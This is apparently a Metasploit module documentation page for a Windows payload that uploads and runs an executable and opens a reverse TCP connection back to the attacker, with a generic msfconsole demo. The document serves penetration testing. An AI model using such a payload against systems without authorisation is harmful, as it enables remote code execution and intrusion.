## Windows Upload/Execute, Reverse TCP Stager (DNS)

Uploads an executable and runs it (staged). Connect back to 
the attacker


## Module Name
payload/windows/upexec/reverse_tcp_dns

## Authors
* vlad902
* sf
* hdm
* skape





## Platforms
* win

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/windows/upexec/reverse_tcp_dns
msf payload(reverse_tcp_dns) > show targets
   ... a list of targets ...
msf payload(reverse_tcp_dns) > set TARGET <target-id>
msf payload(reverse_tcp_dns) > show options
   ... show and set options ...
msf payload(reverse_tcp_dns) > run
```
    
    